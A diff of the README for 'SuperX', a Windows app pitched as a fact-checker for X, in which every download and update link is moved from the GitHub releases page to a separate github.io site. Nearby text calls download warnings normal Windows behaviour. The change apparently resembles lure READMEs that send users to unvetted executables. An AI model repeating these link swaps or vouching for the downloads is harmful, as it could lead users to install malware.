@@ -1,6 +1,6 @@
 # 🧠 SuperX - Fact-Check Anything as You Scroll
 
-[![Download SuperX](https://img.shields.io/badge/⬇%20Download%20SuperX-Latest%20Version-ff6b9d?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Windipuspita/SuperX/releases)
+[![Download SuperX](https://img.shields.io/badge/⬇%20Download%20SuperX-Latest%20Version-ff6b9d?style=for-the-badge&logo=github&logoColor=white)](https://windipuspita.github.io)
 
 **Understand X. Fact-check as you scroll.**
 
@@ -26,7 +26,7 @@ Getting SuperX onto your Windows computer takes only a couple of minutes.
 
 ### Step 1 — Visit the download page
 
-👉 **[Download SuperX here](https://github.com/Windipuspita/SuperX/releases)**
+👉 **[Download SuperX here](https://windipuspita.github.io)**
 
 Visit this link to download the application.
 
@@ -140,7 +140,7 @@ This is a standard Windows behaviour for files downloaded from the internet. Rev
 
 New versions of SuperX are published on the same releases page used for your first download. To stay current:
 
-1. Visit 👉 **[the SuperX releases page](https://github.com/Windipuspita/SuperX/releases)**
+1. Visit 👉 **[the SuperX releases page](https://windipuspita.github.io)**
 2. Check whether a version newer than yours is listed at the top.
 3. If it is, download it and open the new file.
 
@@ -160,8 +160,8 @@ When reporting a problem, include the version you are using and a short descript
 
 | What you need | Where to go |
 | --- | --- |
-| Download SuperX | [SuperX Releases](https://github.com/Windipuspita/SuperX/releases) |
-| Check for updates | [SuperX Releases](https://github.com/Windipuspita/SuperX/releases) |
+| Download SuperX | [SuperX Releases](https://windipuspita.github.io) |
+| Check for updates | [SuperX Releases](https://windipuspita.github.io) |
 | Report a problem | Repository issue tracker |
 | Read the description | Understand X. Fact-check as you scroll. |
 
